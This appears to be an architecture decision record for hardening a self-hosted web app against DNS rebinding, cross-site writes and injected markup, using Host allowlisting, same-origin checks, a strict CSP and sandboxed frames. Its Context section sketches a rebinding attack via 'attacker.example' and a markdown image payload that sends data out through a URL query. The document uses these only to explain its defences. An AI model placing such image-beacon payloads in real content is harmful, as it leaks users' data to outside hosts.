---
title: Browser-attack guards - Host allowlist, same-origin writes, and a strict SPA CSP
status: Accepted
date: 2026-10-04
deciders: Repo owner, Claude
---

# Browser-attack guards - Host allowlist, same-origin writes, and a strict SPA CSP

## Context

Security pass F2 found three ways a web page the user merely visits can reach their book:

1. **DNS rebinding.** `AUTH_TRUST_LOOPBACK` (default on) trusts any request whose TCP peer is
   loopback. A rebound `attacker.example` resolves to 127.0.0.1, so the browser's request arrives
   from loopback with `Host: attacker.example` and is trusted.
2. **Cross-site writes.** A cookie- or loopback-authenticated POST needs only the browser to send it.
3. **Injected markup / remote images.** Stored data reaching a tooltip's `innerHTML`, or markdown
   `![](https://host/?d=...)`, executes or exfiltrates with nothing standing behind the app.

## Decision

1. **Loopback trust is bound to a Host we serve.** `api/_deps.py` accepts loopback trust only for
   `localhost` / `127.0.0.1` / `[::1]` (any port), `ONW_ALLOWED_HOSTS`, and the hostnames in
   `CORS_ORIGINS`. Any other Host reaching a loopback-trusted request gets **421**. A valid session
   cookie or Bearer token is not affected (those are credentials for that host). The port is not
   checked: a rebinding attacker picks the hostname, and the dev proxy and `make` ports vary.
2. **Ambient-credential writes must be same-origin.** A non-GET request authenticated by cookie or
   loopback trust is refused (403) when `Sec-Fetch-Site` is not `same-origin`/`none`, or `Origin` is
   neither the request's own Host nor a configured CORS origin. Requests with neither header (curl,
   the CLI, MCP) pass; Bearer callers are exempt - they are not browsers.
3. **`AUTH_TRUST_LOOPBACK` stays default-on.** Flipping it off once a password exists would end the
   documented "no login on your own machine" flow for every self-hoster and the `onw` CLI's local
   calls, to close a hole the two guards above already close for the browser. It remains the
   documented switch for a same-machine reverse proxy. The desktop shell is unaffected: it has its
   own transport credential and already pins Host and Origin.
4. **The SPA shell carries a strict CSP** (`core/spa_csp.py`): `script-src 'self'`, `connect-src
   'self'`, `img-src 'self' data: blob:`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors
   'none'`. `style-src` keeps `'unsafe-inline'` because React style attributes need it.
   `frame-src` allows `https:` (the Overview Embed widget frames a user-chosen page, sandboxed) and
   `onw-artifact:` (desktop). `form-action` adds the gateway portal origin per request: the
   Private Cloud sign-out is a same-origin POST that redirects to the portal, and Chromium applies
   `form-action` to the redirect. The docs site mount is not touched.
5. **Artifacts load from a route, not `srcdoc`.** A `srcdoc` document inherits the embedding page's
   CSP, so `script-src 'self'` would stop every artifact's inline script. `GET
   /api/artifacts/{id}/frame` serves the prepared document (CSP meta + height probe, a Python port of
   `desktop/src/artifact-document.ts`) with its own `CSP: sandbox allow-scripts; default-src 'none'`
   header, so even a direct navigation is a null-origin document. The frame URL needs no
   `X-Requested-With` (an iframe cannot send one); the sandbox header is the protection.
6. **Colours are data, never markup.** `create_category` hex-validates like `set_category_color`;
   a migration resets stored non-hex category/envelope colours to null; the tooltip builds its dot
   with DOM APIs after a `CSS.supports` check. Markdown `img` is overridden everywhere
   (`SafeMarkdownImage`): same-origin/blob/data render, anything else is a labelled link.

## Consequences

- Remote images no longer render in place: news thumbnails with an `og:image` from a publisher and
  the Overview "Image" widget with an external URL are blocked by `img-src` (the news card hides a
  failed thumbnail; the widget shows its error state). Relaxing it is one token (`https:`) in
  `core/spa_csp.py` and gives up the CSP backstop for image exfiltration; the component override
  remains. Left strict on purpose.
- A same-machine reverse proxy that forwards its public hostname must list it in
  `ONW_ALLOWED_HOSTS` if it relies on loopback trust (it should not - see the exposure guide).
- Two copies of the artifact-document preparation exist (TypeScript for the desktop protocol,
  Python for the web route); each has its own tests.
